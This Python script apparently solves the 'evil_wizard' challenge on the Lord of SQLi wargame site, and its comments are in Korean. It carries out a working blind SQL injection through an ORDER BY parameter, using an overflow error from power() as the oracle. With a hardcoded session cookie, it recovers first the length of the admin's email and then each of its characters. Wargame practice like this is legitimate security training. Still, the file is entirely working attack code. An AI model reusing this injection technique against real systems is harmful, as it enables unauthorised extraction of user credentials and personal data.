# -*- coding: utf-8 -*-
import urllib.request

answer = ""
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
session_id = "PHPSESSID="+"5u84grpvs4dd5tsgg6st4q4kse"

url_start = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"+'?'
pw_len = 0
word_len = 0

print("비밀번호 크기 찾는 중")
while 1:
    pw_len += 1

    url_len = url_start + "order=(select%20(power(10,100000000))%20where%20(id=%27admin%27%20and%20length(email)={}))".format(str(pw_len))

    #print(pw_len)
    print('.', end= ' ')

    req_len = urllib.request.Request(url_len)  # 엔터 치기전 상태
    req_len.add_header('User-agent', user_agent)  # 헤더값 설정(los가 뱉어냄)
    req_len.add_header("Cookie", session_id)

    res_len = urllib.request.urlopen(req_len)  # 엔터누른 효과
    data_len = res_len.read().decode('utf-8')  # 본문만 가져오기


    if data_len.find("</th></table><hr>") != -1:
        print('\n\n비밀번호 크기 : {}\n'.format(str(pw_len)))
        break

print("한 단어 크기 찾는 중\n")
while 1:
    word_len += 1
    url_word = url_start + "order=(select%20(power(10,100000000))%20where%20(id=%27admin%27%20and%20length(mid(email,1,1))={}))".format(str(word_len))
    #print(word_len)

    req_word = urllib.request.Request(url_word)  # 엔터 치기전 상태
    req_word.add_header('User-agent', user_agent)  # 헤더값 설정(los가 뱉어냄)
    req_word.add_header("Cookie", session_id)

    res_word = urllib.request.urlopen(req_word)  # 엔터누른 효과
    data_word = res_word.read().decode('utf-8')  # 본문만 가져오기


    if data_word.find("</th></table><hr>") != -1:
        print('1단어 크기 : {}\n'.format(str(word_len)))
        break

password_length = int(pw_len/word_len)
print('비밀번호 글자 수 : {}\n'.format(password_length))

print("비밀번호 찾는 중\n")
for i in range(1, password_length+1):
    print("{}번째 찾는 중".format(str(i)))
    for j in range(32, 127):

        url_pw = url_start+"order=(select%20(power(10,100000000))%20where%20(id=%27admin%27%20and%20ord(mid(email,{},1))={}))".format(str(i), str(j))

        #print(url_pw)
        print("{}".format(chr(j)))

        req_pw = urllib.request.Request(url_pw)  # 엔터 치기전 상태
        req_pw.add_header('User-agent', user_agent)  # 헤더값 설정(los가 뱉어냄)
        req_pw.add_header("Cookie", session_id)

        res_pw = urllib.request.urlopen(req_pw)  # 엔터누른 효과
        data_pw = res_pw.read().decode('utf-8')  # 본문만 가져오기

        if data_pw.find("</th></table><hr>") != -1:
            print("{}번쨰 문자 : {}".format(str(i), chr(j)))
            answer += chr(j)
            break

print("비밀번호 : {}".format(answer))


